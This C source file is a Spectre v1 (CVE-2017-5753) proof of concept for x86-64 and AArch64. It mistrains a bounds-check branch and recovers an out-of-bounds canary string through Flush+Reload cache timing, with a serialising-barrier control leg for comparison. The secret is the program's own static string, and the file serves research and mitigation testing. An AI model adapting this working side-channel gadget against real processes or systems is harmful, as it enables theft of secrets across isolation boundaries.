/*
 * SPDX-License-Identifier: GPL-2.0-only
 * Copyright (C) 2026 Maciej Gojny, GG Advanced IT Security UG
 *
 * spectre-v1-oneshot -- Spectre v1 (bounds-check bypass, CVE-2017-5753), a
 * cross-platform Flush+Reload demonstration for x86-64 and AArch64.
 *
 * The same source builds for both ISAs; only the flush, timer and barrier
 * primitives differ. It uses the shared oracle and encode headers in
 * framework/oracle and framework/encode, so the cache channel and class
 * encoding are identical on both architectures.
 *
 * Mechanism. A victim gadget guards an array read with a bounds check:
 *
 *     if (x < array1_size) tmp = oracle[ enc_cls_of(array1[x]) * STRIDE ];
 *
 * The branch is mistrained with in-bounds x so the predictor learns "taken",
 * then called with a malicious x = &secret - array1 (+ byte index). With the
 * bound flushed from cache the comparison stalls, the CPU speculates past it,
 * speculatively reads the out-of-bounds secret byte and pulls that byte's class
 * line into the cache. The architectural result is discarded, but the cache
 * footprint survives, and Flush+Reload reads the class back -> the secret byte.
 *
 * Controls.
 *   positive (control=none)    : mistrained + speculative, recovers the secret.
 *   negative (control=barrier) : a serialising barrier between the bounds check
 *                                and the use (lfence on x86, dsb+isb on AArch64)
 *                                serialises the taken path, so speculation never
 *                                runs the leak -- the secret class stays cold.
 *   The barrier leg is what shows the recovered signal comes from speculative
 *   execution rather than a measurement artifact. ARM's production Spectre-v1
 *   fix is array_index_mask_nospec (csel + csdb), which this demo does not
 *   implement; see the README.
 *
 * The secret is a neutral, hardcoded ASCII string held in this process's own
 * static storage and read back by the same process. Nothing crosses a privilege
 * or process boundary.
 *
 * Full-byte recovery. The 64-class oracle carries only the byte's low six bits
 * (enc_cls_of). To print the secret as ASCII, each byte is read twice: a low pass
 * (the scored one) and a high pass whose gadget shifts the byte right by HI_SHIFT
 * before the same encode, exposing bits [7..HI_SHIFT]. The two classes
 * reconstruct the full byte (reconstruct_byte). The scored class lines and the
 * verdict come from the low pass alone.
 *
 * Decoder limit. A byte whose class equals the training value's class (63, for
 * TRAIN_VALUE 0x00) is excluded from decode, because the in-bounds training keeps
 * that class hot. The demo secret contains no such byte, so this does not affect
 * the canary result, but the decoder does not recover every possible byte value.
 *
 * Env:
 *   CPU=<n>            logical cpu to pin (default 1)
 *   ROUNDS=<n>         Flush+Reload rounds per secret byte (default 16)
 *   CONTROL=none|lfence|csdb|dsb-isb   leg to run (default none; the barrier
 *                      name is ISA-specific and any is accepted on either build)
 *   SELFTEST=1         calibrate + decode the first secret byte, then exit
 */
#define _GNU_SOURCE
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "encode.h"
#include "oracle.h"

/* Shared geometry and channel, under local names; the numbers live in
 * framework/encode and framework/oracle. */
#define SLOT_SIZE    ENC_SLOT_SIZE
#define NCLASS       ENC_NCLASS
#define XOR_KEY      ENC_XOR_KEY
#define CLASS_MASK   (ENC_NCLASS - 1)
#define HOT_CYCLES   150   /* pre-calibration fallback; oracle_threshold calibrates */
#define flush_line   oracle_flush_line
#define reload_time  oracle_reload_time

#define ARR1_SZ        16
#define TRAIN_IDX      0
#define INNER          30     /* interleaved iterations; malicious index every 6th */
#define DELAY_DEF      100
#define DEFAULT_CPU    1
#define DEFAULT_ROUNDS 16
#define TRAIN_VALUE    0x00   /* array1 training content; its class is excluded below */
#define TRAIN_CLASS    ((TRAIN_VALUE ^ XOR_KEY) & CLASS_MASK) /* 63 */

/* Pass B shifts the secret byte right by this many bits inside the gadget before
 * the shared 64-class encode, so a second run exposes the high bits the 6-bit
 * class omits. reconstruct_byte() below assumes HI_SHIFT == 2. */
#define HI_SHIFT       2
#define STR_(x)        #x
#define STR(x)         STR_(x)

/* The control leg's serialising barrier and its name, per ISA. x86 uses lfence;
 * on AArch64 (Cortex-A76 is ARMv8.2, so no SB instruction) a full dsb+isb
 * serialises execution so the mispredicted path never runs the leak. Both are
 * execution-serialising barriers. ARM's production Spectre-v1 fix is
 * array_index_mask_nospec (csel + csdb), which the README describes; the control
 * leg here is the barrier, mirroring the lfence leg on x86. */
#if defined(__aarch64__)
#define BARRIER_NAME  "dsb-isb"
#define SPEC_BARRIER  asm volatile("dsb sy\n\tisb" ::: "memory")
#else
#define BARRIER_NAME  "lfence"
#define SPEC_BARRIER  asm volatile("lfence" ::: "memory")
#endif

/* In-bounds training data. */
static uint8_t array1[ARR1_SZ];

/* The bounds guard, in its own cache line so a clflush of it stalls the compare
 * and widens the speculation window. Written once, only ever flushed after. */
static volatile uint64_t bound_store __attribute__((aligned(64)));
static volatile uint64_t *array1_size = &bound_store;

/* The Flush+Reload oracle: one class slot per possible byte value. */
static char oracle_buf[ENC_SLOT_SIZE * ENC_NCLASS] __attribute__((aligned(0x1000)));
static char *oracle = oracle_buf;

/* The secret to recover. Neutral ASCII, this process's own storage -- never the
 * user's keyword, never anything that crosses a boundary. */
static const char secret[] = "spectre-v1 canary";

static int delay = DELAY_DEF;
static int control_lfence = 0;

/* Hot/cold threshold: the historical constant until calibrated from this host
 * so the decode survives a slow governor. */
static uint64_t hot_threshold = HOT_CYCLES;

static void pin_cpu(int cpu)
{
    cpu_set_t set;

    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    if (sched_setaffinity(0, sizeof(set), &set) != 0) {
        perror("sched_setaffinity");
        exit(1);
    }
}

static void read_sysfs_line(const char *path, char *buf, size_t n)
{
    FILE *f = fopen(path, "r");

    buf[0] = '\0';
    if (f == NULL)
        return;
    if (fgets(buf, (int)n, f) != NULL) {
        size_t len = strlen(buf);

        while (len > 0 && (buf[len - 1] == '\n' || buf[len - 1] == ' ' ||
                           buf[len - 1] == '\t'))
            buf[--len] = '\0';
    }
    fclose(f);
}

/* Prints the runtime state of the host (governor, frequency, SMT, ASLR) so a
 * recorded run can be read against the conditions it was taken under. */
static void print_host_state(int cpu)
{
    char gov[64], online[64], fcur[32], fmin[32], fmax[32], smt[64], aslr[16];
    char path[256];

    snprintf(path, sizeof(path),
             "/sys/devices/system/cpu/cpu%d/cpufreq/scaling_governor", cpu);
    read_sysfs_line(path, gov, sizeof(gov));
    read_sysfs_line("/sys/devices/system/cpu/online", online, sizeof(online));
    snprintf(path, sizeof(path),
             "/sys/devices/system/cpu/cpu%d/cpufreq/scaling_cur_freq", cpu);
    read_sysfs_line(path, fcur, sizeof(fcur));
    snprintf(path, sizeof(path),
             "/sys/devices/system/cpu/cpu%d/cpufreq/scaling_min_freq", cpu);
    read_sysfs_line(path, fmin, sizeof(fmin));
    snprintf(path, sizeof(path),
             "/sys/devices/system/cpu/cpu%d/cpufreq/scaling_max_freq", cpu);
    read_sysfs_line(path, fmax, sizeof(fmax));
    snprintf(path, sizeof(path),
             "/sys/devices/system/cpu/cpu%d/topology/thread_siblings_list", cpu);
    read_sysfs_line(path, smt, sizeof(smt));
    read_sysfs_line("/proc/sys/kernel/randomize_va_space", aslr, sizeof(aslr));

    printf("host cpu=%d governor=%s online=%s freq_khz=%s freq_min_khz=%s "
           "freq_max_khz=%s smt=%s aslr=%s\n",
           cpu, gov[0] ? gov : "?", online[0] ? online : "?",
           fcur[0] ? fcur : "?", fmin[0] ? fmin : "?", fmax[0] ? fmax : "?",
           smt[0] ? smt : "?", aslr[0] ? aslr : "?");
}

/* Bare flush of the bound: NOT flush_line(), whose trailing barriers would
 * serialise and narrow the misprediction window. The bound is never written
 * after setup, so no store needs draining here. On AArch64 the clean+invalidate
 * is DC CIVAC; a dsb is still needed for the maintenance op to take effect
 * before the compare reloads it (without it the line may not actually miss). */
static inline void flush_bare(void *p)
{
#if defined(__aarch64__)
    asm volatile("dc civac, %0\n\tdsb ish" :: "r"(p) : "memory");
#else
    asm volatile("clflush (%0)" :: "r"(p) : "memory");
#endif
}

/*
 * The speculative tail, shared by both gadget variants. Written as asm, not C,
 * so the shadow load's destination is a register the flushed bound load does
 * not also write; otherwise store-to-load forwarding can suppress the leak.
 * Pinning it to rdx keeps the bound load's rax out of the dependent chain. The
 * byte is mapped to its class with the shared key (v ^ 0x3f) & 0x3f before
 * indexing the oracle.
 */
#if defined(__x86_64__)
#define LEAK_TAIL                                                   \
    asm volatile(                                                   \
        "movzbl (%1), %%edx\n\t"                                    \
        "xorb %3, %%dl\n\t"                                         \
        "movzbl %%dl, %%edx\n\t"                                    \
        "and %4, %%edx\n\t"                                         \
        "imul %2, %%rdx\n\t"                                        \
        "movq (%0, %%rdx), %%rdx\n\t"                               \
        :                                                           \
        : "r"(oracle), "r"((uintptr_t)array1 + x),                  \
          "r"((unsigned long)SLOT_SIZE),                            \
          "i"(XOR_KEY), "i"(CLASS_MASK)                             \
        : "rdx", "memory")

/* Pass B variant: identical to LEAK_TAIL but shifts the byte right by HI_SHIFT
 * before the encode, so the 6-bit class carries bits [7..HI_SHIFT] of the secret
 * byte instead of the low six -- the high bits the low pass cannot see. */
#define LEAK_TAIL_HI                                                \
    asm volatile(                                                   \
        "movzbl (%1), %%edx\n\t"                                    \
        "shr $" STR(HI_SHIFT) ", %%edx\n\t"                         \
        "xorb %3, %%dl\n\t"                                         \
        "movzbl %%dl, %%edx\n\t"                                    \
        "and %4, %%edx\n\t"                                         \
        "imul %2, %%rdx\n\t"                                        \
        "movq (%0, %%rdx), %%rdx\n\t"                               \
        :                                                           \
        : "r"(oracle), "r"((uintptr_t)array1 + x),                  \
          "r"((unsigned long)SLOT_SIZE),                            \
          "i"(XOR_KEY), "i"(CLASS_MASK)                             \
        : "rdx", "memory")

#elif defined(__aarch64__)
/* AArch64 speculative tail. Mirrors the x86 version: load the (out-of-bounds)
 * secret byte, fold in the shared key and mask to a 6-bit class, scale by the
 * slot stride, and touch that oracle slot so Flush+Reload reads the class back.
 * A fixed scratch register (x9) carries the dependent chain -- the ARM analog of
 * pinning the x86 tail to rdx -- so the shadow load's address never shares a
 * register the compiler used for the bound load. */
#define LEAK_TAIL                                                   \
    asm volatile(                                                   \
        "ldrb w9, [%0]\n\t"                                         \
        "eor  w9, w9, %w1\n\t"                                      \
        "and  w9, w9, %w2\n\t"                                      \
        "madd x9, x9, %3, xzr\n\t"                                  \
        "ldr  x9, [%4, x9]\n\t"                                     \
        :                                                           \
        : "r"((uintptr_t)array1 + x),                               \
          "r"((unsigned long)XOR_KEY),                              \
          "r"((unsigned long)CLASS_MASK),                           \
          "r"((unsigned long)SLOT_SIZE), "r"(oracle)                \
        : "x9", "memory")

/* Pass B: shift the byte right by HI_SHIFT before the encode, so the 6-bit class
 * carries bits [7..HI_SHIFT] -- the high bits the low pass cannot see. */
#define LEAK_TAIL_HI                                                \
    asm volatile(                                                   \
        "ldrb w9, [%0]\n\t"                                         \
        "lsr  w9, w9, #" STR(HI_SHIFT) "\n\t"                       \
        "eor  w9, w9, %w1\n\t"                                      \
        "and  w9, w9, %w2\n\t"                                      \
        "madd x9, x9, %3, xzr\n\t"                                  \
        "ldr  x9, [%4, x9]\n\t"                                     \
        :                                                           \
        : "r"((uintptr_t)array1 + x),                               \
          "r"((unsigned long)XOR_KEY),                              \
          "r"((unsigned long)CLASS_MASK),                           \
          "r"((unsigned long)SLOT_SIZE), "r"(oracle)                \
        : "x9", "memory")
#else
#error "spectre-v1-oneshot: no speculative tail for this architecture"
#endif

static void __attribute__((noinline)) gadget_leak(size_t x)
{
    if (x < *array1_size) {
        LEAK_TAIL;
    }
}

/* The mitigated variant: a serialising barrier between the resolved branch and
 * the use (lfence on x86, dsb+isb on AArch64; see SPEC_BARRIER). */
static void __attribute__((noinline)) gadget_fenced(size_t x)
{
    if (x < *array1_size) {
        SPEC_BARRIER;
        LEAK_TAIL;
    }
}

/* Pass B gadgets: the same branch-misprediction leak, high-bit encode. */
static void __attribute__((noinline)) gadget_leak_hi(size_t x)
{
    if (x < *array1_size) {
        LEAK_TAIL_HI;
    }
}

static void __attribute__((noinline)) gadget_fenced_hi(size_t x)
{
    if (x < *array1_size) {
        SPEC_BARRIER;
        LEAK_TAIL_HI;
    }
}

/*
 * One attack burst: training and the malicious call interleaved, malicious
 * every 6th iteration, the index selected branchlessly so the store/branch
 * pattern cannot correlate with maliciousness. The bound is flushed and a short
 * delay spent each iteration to keep the comparison in flight.
 */
static void attack(size_t malicious_x, void (*g)(size_t))
{
    int j;

    for (j = INNER - 1; j >= 0; j--) {
        volatile int z;
        long m;
        size_t x;

        flush_bare((void *)(uintptr_t)array1_size);
        for (z = 0; z < delay; z++) { }

        m = ((long)(j % 6) - 1) & ~0xFFFFL;
        m = m | (m >> 16);
        x = (size_t)TRAIN_IDX ^ ((size_t)m & (malicious_x ^ (size_t)TRAIN_IDX));
        g(x);
    }
}

struct recovered {
    int cls;    /* best (majority-hot) class, or -1 if none */
    int hits;   /* hits for that class, out of rounds */
};

/* The order the oracle slots are reloaded in: a fixed scramble, not 0..63
 * ascending. A hardware stride prefetcher -- the Cortex-A76's is aggressive --
 * walks sequentially-accessed slots and warms a to-be-measured line into a
 * mid-level cache ahead of the probe. That shows up as a per-class false-hot
 * noise floor: majority decode survives it (the true class still wins 16/16),
 * but it lifts the suppression control's rate off the floor and the barrier leg
 * reads as "not fully suppressed". Reloading in a scrambled order breaks the
 * stride so flushed slots actually miss to DRAM. (i*37+11) mod 64 is a bijection
 * (gcd(37,64)=1), so every class is still measured exactly once. */
static int reload_order[NCLASS];

static void init_reload_order(void)
{
    int i;

    for (i = 0; i < NCLASS; i++)
        reload_order[i] = (i * 37 + 11) & (NCLASS - 1);
}

/* Recover the class leaked at out-of-bounds offset `off` by scoring every class
 * over `rounds` Flush+Reload rounds and taking the majority-hot one. The 64
 * classes carry the byte's 6-bit projection enc_cls_of(byte), not the byte. */
static struct recovered leak_byte(size_t off, int rounds, void (*g)(size_t))
{
    int hits[NCLASS];
    struct recovered r = { -1, -1 };
    int c, rnd;

    memset(hits, 0, sizeof(hits));
    for (rnd = 0; rnd < rounds; rnd++) {
        for (c = 0; c < NCLASS; c++)
            flush_line(oracle_slot(oracle, c));
        attack(off, g);
        for (c = 0; c < NCLASS; c++) {
            int s = reload_order[c];

            if (reload_time(oracle_slot(oracle, s)) < hot_threshold)
                hits[s]++;
        }
    }
    for (c = 0; c < NCLASS; c++) {
        if (c == TRAIN_CLASS)       /* the training value's class, always hot */
            continue;
        if (hits[c] > r.hits) {
            r.hits = hits[c];
            r.cls = c;
        }
    }
    return r;
}

/* Reconstruct the full secret byte from the low pass (class carries bits 5..0)
 * and the high pass (class carries bits 7..HI_SHIFT). Mirrors the banner walk:
 * low6 = clsA ^ key gives bits 5..0; z = clsB ^ key gives bits [7..2], whose
 * bits 4 and 5 are the byte's bits 6 and 7. Returns -1 if either pass was cold. */
static int reconstruct_byte(int cls_lo, int cls_hi)
{
    int low6, z;

    if (cls_lo < 0 || cls_hi < 0)
        return -1;
    low6 = (cls_lo ^ XOR_KEY) & CLASS_MASK;   /* bits 5..0 */
    z = (cls_hi ^ XOR_KEY) & CLASS_MASK;      /* bits 7..2 */
    return (((z >> 5) & 1) << 7) | (((z >> 4) & 1) << 6) | low6;
}

/* Calibrate hot_threshold from this host (min over clean hits
 * for hot, floor of a flushed scan for cold). Returns 0 on poor separation. */
static int calibrate(void)
{
    char *p = oracle_slot(oracle, 7);
    uint64_t hot = ~0ULL, cold = ~0ULL, t, calibrated;
    int c;

    for (c = 0; c < 8; c++) {
        flush_line(p);
        (void)reload_time(p);
        t = reload_time(p);
        if (t < hot)
            hot = t;
    }
    for (c = 0; c < NCLASS; c++) {
        char *s = oracle_slot(oracle, c);

        flush_line(s);
        t = reload_time(s);
        if (t < cold)
            cold = t;
    }
    calibrated = oracle_threshold(hot, cold);
    if (calibrated)
        hot_threshold = calibrated;
    printf("timing: cold=%llu hot=%llu threshold=%d\n",
           (unsigned long long)cold, (unsigned long long)hot, (int)hot_threshold);
    return calibrated != 0 && cold >= hot_threshold && hot < hot_threshold;
}

static int parse_env(int *cpu, int *rounds)
{
    const char *s;
    char *end;
    long v;

    *cpu = DEFAULT_CPU;
    *rounds = DEFAULT_ROUNDS;

    s = getenv("CPU");
    if (s != NULL) {
        v = strtol(s, &end, 0);
        if (*end != '\0' || v < 0 || v > 4095) {
            fprintf(stderr, "CPU must be a logical cpu number\n");
            return -1;
        }
        *cpu = (int)v;
    }
    s = getenv("ROUNDS");
    if (s != NULL) {
        v = strtol(s, &end, 0);
        if (*end != '\0' || v < 1 || v > 4096) {
            fprintf(stderr, "ROUNDS must be 1..4096\n");
            return -1;
        }
        *rounds = (int)v;
    }
    s = getenv("CONTROL");
    if (s != NULL) {
        /* "none" is the positive leg; any serialising-barrier name selects the
         * control leg. The barrier is ISA-specific (lfence on x86, dsb+isb on
         * AArch64), so both names are accepted on either build rather than
         * forcing the operator to know the mnemonic for the host. */
        if (strcmp(s, "none") == 0)
            control_lfence = 0;
        else if (strcmp(s, "lfence") == 0 || strcmp(s, "csdb") == 0 ||
                 strcmp(s, "dsb-isb") == 0 || strcmp(s, "barrier") == 0)
            control_lfence = 1;
        else {
            fprintf(stderr, "CONTROL must be none|lfence|csdb|dsb-isb|barrier\n");
            return -1;
        }
    }
    return 0;
}

int main(void)
{
    int cpu, rounds, i, matched = 0, recovered_bytes = 0;
    size_t len = strlen(secret), base;
    char recovered_str[sizeof(secret)];

    setvbuf(stdout, NULL, _IOLBF, 0);
    if (parse_env(&cpu, &rounds) != 0)
        return 2;
    pin_cpu(cpu);

    *array1_size = ARR1_SZ;
    memset(array1, TRAIN_VALUE, sizeof(array1));
    memset(oracle_buf, 1, sizeof(oracle_buf)); /* fault the oracle in */
    void (*gadget_lo)(size_t) = control_lfence ? gadget_fenced : gadget_leak;
    void (*gadget_hi)(size_t) = control_lfence ? gadget_fenced_hi : gadget_leak_hi;

    /* array1 + base + i addresses secret[i]; the gadget reads array1[x]. */
    base = (size_t)((uintptr_t)secret - (uintptr_t)array1);

    printf("spectre-v1-oneshot: cpu=%d cve=CVE-2017-5753 class=branch-prediction "
           "secret_len=%zu rounds=%d inner=%d stride=0x%x hot<%d control=%s\n",
           cpu, len, rounds, INNER, SLOT_SIZE, HOT_CYCLES,
           control_lfence ? BARRIER_NAME : "none");
    print_host_state(cpu);

    /* A hook for a timer that needs setting up before first use. Both current
     * backends need none here: x86 times with rdtsc, and AArch64's PMCCNTR_EL0
     * is unlocked out-of-process by the kernel module (kernel/pmu_user_el0.ko),
     * not from inside this process. A backend that unlocks the counter itself
     * would initialise here. */
    oracle_timer_start(cpu);
    init_reload_order();

    if (!calibrate()) {
        printf("selftest: calibration -> FAIL\n");
        printf("verdict: VOID calibration\n");
        return 1;
    }

    /* The scored path uses the 64-class oracle: each byte's 6-bit class
     * enc_cls_of(byte), compared against the expected class (the same low-six-bits
     * projection the data-sampling labs use). The full byte is recovered separately
     * by the second (high-bit) pass, for the legible string -- it does not change
     * the scored class verdict. */
    if (getenv("SELFTEST") != NULL) {
        struct recovered r = leak_byte(base + 0, rounds, gadget_lo);
        struct recovered rhi = leak_byte(base + 0, rounds, gadget_hi);
        int want = enc_cls_of((unsigned char)secret[0]);
        int ok = (r.cls == want) && (r.hits * 2 > rounds);
        int ch = reconstruct_byte(r.cls, rhi.cls);

        printf("selftest: byte0 expect_class=%d got_class=%d hits=%d/%d -> %s\n",
               want, r.cls, r.hits, rounds, ok ? "OK" : "FAIL");
        printf("recovered idx=0 clsA=%d clsB=%d byte=0x%02x char=%c\n",
               r.cls, rhi.cls, ch < 0 ? 0 : ch,
               (ch >= 0x20 && ch <= 0x7e) ? (char)ch : '.');
        printf("verdict: %s\n", ok ? "SELFTEST_OK" : "SELFTEST_FAIL");
        return ok ? 0 : 1;
    }

    printf("== leg=%s control=%s ==\n",
           control_lfence ? "control" : "positive",
           control_lfence ? BARRIER_NAME : "none");
    for (i = 0; i < (int)len; i++) {
        struct recovered r = leak_byte(base + (size_t)i, rounds, gadget_lo);
        int want = enc_cls_of((unsigned char)secret[i]);
        int ok = (r.cls == want) && (r.hits * 2 > rounds);
        struct recovered rb;
        int ch;
        char c;

        if (ok)
            matched++;
        printf("byte idx=%d expect_class=%d got_class=%d hits=%d/%d "
               "majority=%d ok=%d\n",
               i, want, r.cls, r.hits, rounds, r.hits * 2 > rounds, ok);

        /* Pass B: the high bits, so the shared 64-class channel yields the full
         * byte and the leaked secret prints as legible ASCII. */
        rb = leak_byte(base + (size_t)i, rounds, gadget_hi);
        ch = reconstruct_byte(r.cls, rb.cls);
        c = (ch >= 0x20 && ch <= 0x7e) ? (char)ch : '.';
        recovered_str[i] = c;
        if (ch >= 0 && ch == (int)(unsigned char)secret[i])
            recovered_bytes++;
        printf("recovered idx=%d clsA=%d clsB=%d byte=0x%02x char=%c\n",
               i, r.cls, rb.cls, ch < 0 ? 0 : ch, c);
    }
    recovered_str[len] = '\0';

    printf("spectre leg=%s classes_recovered=%d/%zu verdict=%s\n",
           control_lfence ? "control" : "positive", matched, len,
           matched > 0 ? "leak" : "cold");
    printf("recovered leg=%s bytes=%d/%zu string=\"%s\"\n",
           control_lfence ? "control" : "positive", recovered_bytes, len,
           recovered_str);

    if (control_lfence)
        printf("verdict: %s\n", matched == 0 ? "CONTROL_COLD" : "CONTROL_LEAK");
    else
        printf("verdict: %s\n",
               matched == (int)len ? "SPECTRE_LEAK"
                                   : (matched > 0 ? "SPECTRE_PARTIAL" : "SPECTRE_COLD"));
    return 0;
}
